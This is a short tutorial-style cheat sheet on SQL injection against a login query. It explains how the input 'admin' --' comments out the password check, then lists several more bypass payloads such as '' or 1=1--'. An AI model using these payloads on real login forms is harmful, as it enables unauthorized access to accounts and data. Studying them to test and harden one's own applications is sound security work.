# SQL Injection
## Login bypass, password compared in query

Normal Code
```sql

SELECT * FROM `users` WHERE `users.username` = '' AND `users.password` = ''
```
### Lets begin Our SQL injection and see how this will change the normal code
1) **admin' --**

When this is supplied, our code becomes. Notice it will only execute upto the closing quotes on admin (*'admin'*). The rest of the querry is commented out. This will return true if there is a user by that name on our database as we are not checking the second part of the querry.

```sql
SELECT * FROM `users` WHERE `users.username` = 'admin' --' AND `users.password` = ''
```
 
2) **admin' #**
3) **admin'/***
4) **' or 1=1--**
5) **' or 1=1#**
6) **' or 1=1/***
7) **') or '1'='1--**
8) **') or ('1'='1--**
